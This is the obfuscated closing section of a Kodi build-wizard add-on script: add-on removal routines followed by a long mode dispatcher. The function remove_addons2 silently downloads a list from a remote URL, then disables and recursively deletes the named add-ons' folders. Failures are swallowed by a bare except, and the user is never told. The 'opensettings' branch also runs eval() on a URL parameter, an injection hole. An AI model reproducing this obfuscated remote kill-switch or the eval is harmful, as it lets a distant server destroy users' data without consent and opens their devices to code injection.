				OO00O00OO0000O0O0 =json .loads (OOO0000O0O0000OOO )#line:5584
				O00OOO0OO0O00OO0O =os .path .join (addons_folder ,O0000OOO0OO00OO00 )#line:5586
				if os .path .exists (O00OOO0OO0O00OO0O ):#line:5588
					for OOO00OO0O00OOO0O0 ,O0O00OO00O0O00O00 ,O0000OOO0OO00O00O in os .walk (O00OOO0OO0O00OO0O ):#line:5589
						for O00OO0OOO0000000O in O0000OOO0OO00O00O :#line:5590
							os .unlink (os .path .join (OOO00OO0O00OOO0O0 ,O00OO0OOO0000000O ))#line:5591
						for O00O000O0OO00OOO0 in O0O00OO00O0O00O00 :#line:5592
							shutil .rmtree (os .path .join (OOO00OO0O00OOO0O0 ,O00O000O0OO00OOO0 ))#line:5593
					os .rmdir (O00OOO0OO0O00OO0O )#line:5594
			xbmc .executebuiltin ('Container.Refresh')#line:5596
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5597
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5598
	except :pass #line:5599
def remove_addons2 ():#line:5600
	try :#line:5601
			import json #line:5602
			O00OOOO0OO00O0000 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5603
			for OOO00O00O0O00O0O0 in O00OOOO0OO00O0000 :#line:5604
				O00000OO0OO000OOO =OOO00O00O0O00O0O0 .split (':')[1 ].strip ()#line:5606
				O0OOO0O000OOOO00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O00000OO0OO000OOO ,'false')#line:5607
				O00OO0O0OO00000O0 =xbmc .executeJSONRPC (O0OOO0O000OOOO00O )#line:5608
				O0OO00O0OOO00OOOO =json .loads (O00OO0O0OO00000O0 )#line:5609
				OO000O00OO00OO00O =os .path .join (user_folder ,O00000OO0OO000OOO )#line:5611
				if os .path .exists (OO000O00OO00OO00O ):#line:5613
					for O000O00O00O0OO000 ,OO0O0O00O0O0OO0O0 ,O0OOO00OOOO0000O0 in os .walk (OO000O00OO00OO00O ):#line:5614
						for OOO0000O00OO000OO in O0OOO00OOOO0000O0 :#line:5615
							os .unlink (os .path .join (O000O00O00O0OO000 ,OOO0000O00OO000OO ))#line:5616
						for O0O00OOO0O000O00O in OO0O0O00O0O0OO0O0 :#line:5617
							shutil .rmtree (os .path .join (O000O00O00O0OO000 ,O0O00OOO0O000O00O ))#line:5618
					os .rmdir (OO000O00OO00OO00O )#line:5619
	except :pass #line:5621
params =get_params ()#line:5622
url =None #line:5623
name =None #line:5624
mode =None #line:5625
try :mode =urllib .unquote_plus (params ["mode"])#line:5627
except :pass #line:5628
try :name =urllib .unquote_plus (params ["name"])#line:5629
except :pass #line:5630
try :url =urllib .unquote_plus (params ["url"])#line:5631
except :pass #line:5632
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5634
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5635
def setView (OOOOOOO00O0O0O0OO ,O0000000O0OO00OO0 ):#line:5636
	if wiz .getS ('auto-view')=='true':#line:5637
		O0O0O00OOO0O000OO =wiz .getS (O0000000O0OO00OO0 )#line:5638
		if O0O0O00OOO0O000OO =='50'and KODIV >=17 and SKIN =='skin.estuary':O0O0O00OOO0O000OO ='55'#line:5639
		if O0O0O00OOO0O000OO =='500'and KODIV >=17 and SKIN =='skin.estuary':O0O0O00OOO0O000OO ='50'#line:5640
		wiz .ebi ("Container.SetViewMode(%s)"%O0O0O00OOO0O000OO )#line:5641
if mode ==None :index ()#line:5643
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5645
elif mode =='builds':buildMenu ()#line:5646
elif mode =='viewbuild':viewBuild (name )#line:5647
elif mode =='buildinfo':buildInfo (name )#line:5648
elif mode =='buildpreview':buildVideo (name )#line:5649
elif mode =='install':buildWizard (name ,url )#line:5650
elif mode =='theme':buildWizard (name ,mode ,url )#line:5651
elif mode =='viewthirdparty':viewThirdList (name )#line:5652
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5653
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5654
elif mode =='maint':maintMenu (name )#line:5656
elif mode =='passpin':passandpin ()#line:5657
elif mode =='backmyupbuild':backmyupbuild ()#line:5658
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5659
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5660
elif mode =='advancedsetting':advancedWindow (name )#line:5661
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5662
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5663
elif mode =='asciicheck':wiz .asciiCheck ()#line:5664
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5665
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5666
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5667
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5668
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5669
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5670
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5671
elif mode =='currentsettings':viewAdvanced ()#line:5672
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5673
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5674
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5675
elif mode =='fixskin':backtokodi ()#line:5676
elif mode =='testcommand':testcommand ()#line:5677
elif mode =='logsend':logsend ()#line:5678
elif mode =='rdon':rdon ()#line:5679
elif mode =='rdoff':rdoff ()#line:5680
elif mode =='setrd':setrealdebrid ()#line:5681
elif mode =='setrd2':setautorealdebrid ()#line:5682
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5683
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5684
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5685
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5686
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5687
elif mode =='freshstart':freshStart ()#line:5688
elif mode =='forceupdate':wiz .forceUpdate ()#line:5689
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5690
elif mode =='forceclose':wiz .killxbmc ()#line:5691
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5692
elif mode =='hidepassword':wiz .hidePassword ()#line:5693
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5694
elif mode =='enableaddons':enableAddons ()#line:5695
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5696
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5697
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5698
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5699
elif mode =='uploadlog':uploadLog .Main ()#line:5700
elif mode =='viewlog':LogViewer ()#line:5701
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5702
elif mode =='viewerrorlog':errorChecking (all =True )#line:5703
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5704
elif mode =='purgedb':purgeDb ()#line:5705
elif mode =='fixaddonupdate':fixUpdate ()#line:5706
elif mode =='removeaddons':removeAddonMenu ()#line:5707
elif mode =='removeaddon':removeAddon (name )#line:5708
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5709
elif mode =='removedata':removeAddonData (name )#line:5710
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5711
elif mode =='systeminfo':systemInfo ()#line:5712
elif mode =='restorezip':restoreit ('build')#line:5713
elif mode =='restoregui':restoreit ('gui')#line:5714
elif mode =='restoreaddon':restoreit ('addondata')#line:5715
elif mode =='restoreextzip':restoreextit ('build')#line:5716
elif mode =='restoreextgui':restoreextit ('gui')#line:5717
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5718
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5719
elif mode =='traktsync':traktsync ()#line:5720
elif mode =='apk':apkMenu (name )#line:5722
elif mode =='apkscrape':apkScraper (name )#line:5723
elif mode =='apkinstall':apkInstaller (name ,url )#line:5724
elif mode =='speed':speedMenu ()#line:5725
elif mode =='net':net_tools ()#line:5726
elif mode =='GetList':GetList (url )#line:5727
elif mode =='youtube':youtubeMenu (name )#line:5728
elif mode =='viewVideo':playVideo (url )#line:5729
elif mode =='addons':addonMenu (name )#line:5731
elif mode =='addoninstall':addonInstaller (name ,url )#line:5732
elif mode =='savedata':saveMenu ()#line:5734
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5735
elif mode =='managedata':manageSaveData (name )#line:5736
elif mode =='whitelist':wiz .whiteList (name )#line:5737
elif mode =='trakt':traktMenu ()#line:5739
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5740
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5741
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5742
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5743
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5744
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5745
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5746
elif mode =='realdebrid':realMenu ()#line:5748
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5749
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5750
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5751
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5752
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5753
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5754
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5755
elif mode =='login':loginMenu ()#line:5757
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5758
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5759
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5760
elif mode =='clearlogin':loginit .clearSaved (name )#line:5761
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5762
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5763
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5764
elif mode =='contact':notify .contact (CONTACT )#line:5766
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5767
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5768
elif mode =='developer':developer ()#line:5770
elif mode =='converttext':wiz .convertText ()#line:5771
elif mode =='createqr':wiz .createQR ()#line:5772
elif mode =='testnotify':testnotify ()#line:5773
elif mode =='testnotify2':testnotify2 ()#line:5774
elif mode =='servicemanual':servicemanual ()#line:5775
elif mode =='fastinstall':fastinstall ()#line:5776
elif mode =='testupdate':testupdate ()#line:5777
elif mode =='testfirst':testfirst ()#line:5778
elif mode =='testfirstrun':testfirstRun ()#line:5779
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5780
elif mode =='bg':wiz .bg_install (name ,url )#line:5782
elif mode =='bgcustom':wiz .bg_custom ()#line:5783
elif mode =='bgremove':wiz .bg_remove ()#line:5784
elif mode =='bgdefault':wiz .bg_default ()#line:5785
elif mode =='rdset':rdsetup ()#line:5786
elif mode =='mor':morsetup ()#line:5787
elif mode =='mor2':morsetup2 ()#line:5788
elif mode =='resolveurl':resolveurlsetup ()#line:5789
elif mode =='urlresolver':urlresolversetup ()#line:5790
elif mode =='forcefastupdate':forcefastupdate ()#line:5791
elif mode =='traktset':traktsetup ()#line:5792
elif mode =='placentaset':placentasetup ()#line:5793
elif mode =='flixnetset':flixnetsetup ()#line:5794
elif mode =='reptiliaset':reptiliasetup ()#line:5795
elif mode =='yodasset':yodasetup ()#line:5796
elif mode =='numbersset':numberssetup ()#line:5797
elif mode =='uranusset':uranussetup ()#line:5798
elif mode =='genesisset':genesissetup ()#line:5799
elif mode =='fastupdate':fastupdate ()#line:5800
elif mode =='folderback':folderback ()#line:5801
elif mode =='menudata':Menu ()#line:5802
elif mode =='infoupdate':infobuild ()#line:5803
elif mode ==2 :#line:5805
        wiz .torent_menu ()#line:5806
elif mode ==3 :#line:5807
        wiz .popcorn_menu ()#line:5808
elif mode ==8 :#line:5809
        wiz .metaliq_fix ()#line:5810
elif mode ==9 :#line:5811
        wiz .quasar_menu ()#line:5812
elif mode ==5 :#line:5813
        swapSkins ('skin.Premium.mod')#line:5814
elif mode ==13 :#line:5815
        wiz .elementum_menu ()#line:5816
elif mode ==16 :#line:5817
        wiz .fix_wizard ()#line:5818
elif mode ==17 :#line:5819
        wiz .last_play ()#line:5820
elif mode ==18 :#line:5821
        wiz .normal_metalliq ()#line:5822
elif mode ==19 :#line:5823
        wiz .fast_metalliq ()#line:5824
elif mode ==20 :#line:5825
        wiz .fix_buffer2 ()#line:5826
elif mode ==21 :#line:5827
        wiz .fix_buffer3 ()#line:5828
elif mode ==11 :#line:5829
        wiz .fix_buffer ()#line:5830
elif mode ==15 :#line:5831
        wiz .fix_font ()#line:5832
elif mode ==14 :#line:5833
        wiz .clean_pass ()#line:5834
elif mode ==22 :#line:5835
        wiz .movie_update ()#line:5836
elif mode =='adv_settings':buffer1 ()#line:5837
elif mode =='getpass':getpass ()#line:5838
elif mode =='setpass':setpass ()#line:5839
elif mode =='setuname':setuname ()#line:5840
elif mode =='passandUsername':passandUsername ()#line:5841
elif mode =='9':disply_hwr ()#line:5842
elif mode =='99':disply_hwr2 ()#line:5843
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))